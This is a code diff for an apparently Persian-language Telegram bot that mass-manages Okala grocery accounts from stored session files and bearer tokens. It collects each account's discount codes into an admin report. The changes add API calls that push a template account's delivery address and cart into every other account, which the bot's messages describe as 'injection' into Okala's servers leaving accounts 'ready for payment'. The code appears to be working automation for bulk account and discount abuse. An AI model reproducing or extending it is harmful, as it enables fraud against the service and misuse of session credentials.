@@ -10,6 +10,7 @@ import base64
 import tempfile
 import shutil
 import requests
+import random
 import redis.asyncio as redis 
 from concurrent.futures import ThreadPoolExecutor
 from aiohttp import web
@@ -28,23 +29,66 @@ PHONE, OTP, ASK_NAME = range(3)
 executor = ThreadPoolExecutor(max_workers=10)
 
 BASE_HEADERS = {
-    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
-    "Origin": "https://www.okala.com",
-    "Referer": "https://www.okala.com/"
+    'accept': 'application/json, text/plain, */*',
+    'source': 'okala',
+    'ui-version': '2.0',
+    'origin': 'https://www.okala.com',
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/137.0.0.0 Mobile'
 }
 
 # ==========================================
-# توابع مربوط به تخفیف و آیدی
+# توابع مربوط به آیدی، تخفیف و APIهای اکالا
 # ==========================================
 def get_user_id_from_token(token):
     try:
         payload = token.split('.')[1]
         payload += '=' * (-len(payload) % 4)
         decoded_bytes = base64.urlsafe_b64decode(payload)
-        decoded_json = json.loads(decoded_bytes)
-        return decoded_json.get('cerberusId') or decoded_json.get('alternativeCustomerId')
+        data = json.loads(decoded_bytes)
+        uid = data.get('userId') or data.get('alternativeCustomerId')
+        return int(uid) if uid else 0
     except Exception:
-        return None
+        return 0
+
+async def api_add_address(token, uid, addr_data):
+    url = 'https://apigateway.okala.com/api/voyager/C/CustomerAccount/AddAddress/'
+    payload = {
+        'id': 0, 'customerId': uid, 'mobilePhone': '', 'ShoppingSectorPartId': '0',
+        'shoppingSectorId': '0', 'plaque': str(addr_data.get('plaque', '0')), 
+        'unit': str(addr_data.get('unit', '1')), 'lat': float(addr_data.get('lat', 0)),
+        'lng': float(addr_data.get('lng', 0)), 'title': None, 'addressTypeId': 3, 
+        'oprationDuration': random.randint(10000, 20000), 
+        'address': addr_data.get('address', 'آدرس ثبت شده'),
+        'mapPlatform': 'ParsiMap'
+    }
+    headers = BASE_HEADERS.copy()
+    headers['Authorization'] = f'Bearer {token}'
+    headers['X-Correlation-Id'] = str(uuid.uuid4())
+    
+    loop = asyncio.get_running_loop()
+    try:
+        res = await loop.run_in_executor(executor, lambda: requests.post(url, json=payload, headers=headers, timeout=15))
+        return res.status_code == 200
+    except Exception:
+        return False
+
+async def api_add_to_cart(token, uid, store_id, product_id):
+    url = 'https://apigateway.okala.com/api/Basket/v2/ShoppingCart/AddToShoppingCart'
+    payload = {
+        'storeId': store_id, 'customerId': uid, 'productId': product_id, 'quantity': 1,
+        'isSupplier': False, 'replaceItemMethodCode': -1, 'sectorId': '0', 'sectorPartId': '0',
+        'productStoreId': '0', 'queryId': None
+    }
+    headers = BASE_HEADERS.copy()
+    headers['Authorization'] = f'Bearer {token}'
+    headers['X-Correlation-Id'] = str(uuid.uuid4())
+    
+    loop = asyncio.get_running_loop()
+    try:
+        res = await loop.run_in_executor(executor, lambda: requests.post(url, json=payload, headers=headers, timeout=15))
+        return res.status_code == 200
+    except Exception:
+        return False
 
 async def process_discounts_and_send_report(bot, acc_keys):
     report_text = "🎁 **گزارش کدهای تخفیف دیتابیس:**\n\n"
@@ -59,7 +103,8 @@ async def process_discounts_and_send_report(bot, acc_keys):
         user_uuid = get_user_id_from_token(access_token)
         if not user_uuid: continue
             
-        headers = {'Authorization': f'Bearer {access_token}', 'Accept': 'application/json', 'source': 'okala', 'ui-version': '2.0', 'User-Agent': BASE_HEADERS["User-Agent"]}
+        headers = BASE_HEADERS.copy()
+        headers['Authorization'] = f'Bearer {access_token}'
         url = f"https://apigateway.okala.com/api/discount/v1/discounts/customer/{user_uuid}"
         
         try:
@@ -167,10 +212,10 @@ async def handle_zip_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
 
         # ===================================================
-        # حالت سوم: کپی سبد خرید و آدرس اولین اکانت به بقیه
+        # حالت سوم: کپی سبد خرید و آدرس (با اعمال روی سرور)
         # ===================================================
         if action == 'zip_sync_cart':
-            await msg.edit_text("🛒 در حال خواندن اطلاعات اولین اکانت و اعمال روی سایرین...")
+            await msg.edit_text("🛒 در حال خواندن اطلاعات اکانت الگو و تزریق در سرور اکالا (کمی زمان‌بر است)...")
             
             first_file = json_files[0]
             source_cart, source_map = None, None
@@ -191,7 +236,19 @@ async def handle_zip_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await msg.edit_text("❌ نتوانستم اطلاعات سبد خرید/آدرس را از اولین اکانت استخراج کنم.")
                 return
                 
-            links_text = "🛒 **لینک‌های آپدیت شده با سبد خرید و آدرس جدید:**\n\n"
+            # پارس کردن دیتا برای ارسال به API
+            cart_dict = json.loads(source_cart)
+            map_dict = json.loads(source_map)
+            
+            addr_data = map_dict.get('selectedCity', {})
+            store_id = None
+            cart_items = []
+            
+            if cart_dict.get('cartData') and len(cart_dict['cartData']) > 0:
+                store_id = cart_dict['cartData'][0].get('storeId')
+                cart_items = cart_dict['cartData'][0].get('items', [])
+
+            links_text = "🛒 **لینک‌های آپدیت شده (تزریق موفق در سرور):**\n\n"
             count = 0
             
             for filename in json_files:
@@ -214,6 +271,7 @@ async def handle_zip_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                     elif item.get('name') == 'refresh_token': 
                                         refresh_token = item.get('value')
                         
+                        # اعمال لوکال استوریج
                         for origin in data.get('origins', []):
                             for item in origin.get('localStorage', []):
                                 if item.get('name') == 'persist:root':
@@ -222,6 +280,17 @@ async def handle_zip_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                     persist_root['mapInfo'] = source_map
                                     item['value'] = json.dumps(persist_root, ensure_ascii=False)
                         
+                        # 🌐 تزریق در سرور اکالا 🌐
+                        if access_token:
+                            uid = get_user_id_from_token(access_token)
+                            if uid != 0:
+                                await api_add_address(access_token, uid, addr_data)
+                                if store_id and cart_items:
+                                    for item in cart_items:
+                                        for _ in range(item.get('quantity', 1)):
+                                            await api_add_to_cart(access_token, uid, store_id, item.get('productId'))
+                                            await asyncio.sleep(0.3)
+
                         updated_content = json.dumps(data, ensure_ascii=False)
                         phone = filename.replace('.json', '')
                         
@@ -240,7 +309,7 @@ async def handle_zip_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if len(links_text) > 4000:
                 file_out = io.BytesIO(links_text.encode('utf-8'))
                 file_out.name = f"Synced_Cart_Links_{int(time.time())}.txt"
-                await context.bot.send_document(chat_id=ADMIN_ID, document=file_out, caption=f"✅ {count} اکانت با سبد و آدرس جدید بروزرسانی شد.")
+                await context.bot.send_document(chat_id=ADMIN_ID, document=file_out, caption=f"✅ {count} اکانت در سرور اکالا آپدیت و آماده پرداخت شد.")
                 await msg.delete()
             else:
                 await msg.edit_text(f"✅ {count} اکانت آپدیت شد:\n\n{links_text}", disable_web_page_preview=True)
@@ -323,7 +392,8 @@ async def handle_zip_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         if access_token:
                             user_uuid = get_user_id_from_token(access_token)
                             if user_uuid:
-                                headers = {'Authorization': f'Bearer {access_token}', 'Accept': 'application/json', 'source': 'okala', 'ui-version': '2.0', 'User-Agent': BASE_HEADERS["User-Agent"]}
+                                headers = BASE_HEADERS.copy()
+                                headers['Authorization'] = f'Bearer {access_token}'
                                 url = f"https://apigateway.okala.com/api/discount/v1/discounts/customer/{user_uuid}"
                                 
                                 loop = asyncio.get_running_loop()
@@ -445,7 +515,7 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
     elif data == "admin_zip_sync_cart":
         context.user_data['admin_zip_action'] = 'zip_sync_cart'
-        await query.message.reply_text("🛒 **کپی سبد خرید و آدرس:**\n\nفایل زیپ را ارسال کنید. ربات اطلاعات سبد خرید و آدرس **اولین اکانت** را استخراج کرده و برای تمام اکانت‌های دیگر اِعمال می‌کند.", parse_mode='Markdown')
+        await query.message.reply_text("🛒 **کپی سبد خرید و آدرس:**\n\nفایل زیپ را ارسال کنید. ربات اطلاعات سبد خرید و آدرس **اولین اکانت** را استخراج کرده و ضمن تزریق در سرور، روی بقیه اکانت‌ها اعمال می‌کند.", parse_mode='Markdown')
 
     elif data == "admin_export":
         acc_keys = await redis_client.keys("account:*")
@@ -617,7 +687,7 @@ async def main():
     await application.start()
     await application.updater.start_polling()
     
-    logging.info("🚀 System is fully operational and bug-free...")
+    logging.info("🚀 Server is live with Backend Injection...")
     stop_signal = asyncio.Event()
     await stop_signal.wait()
 
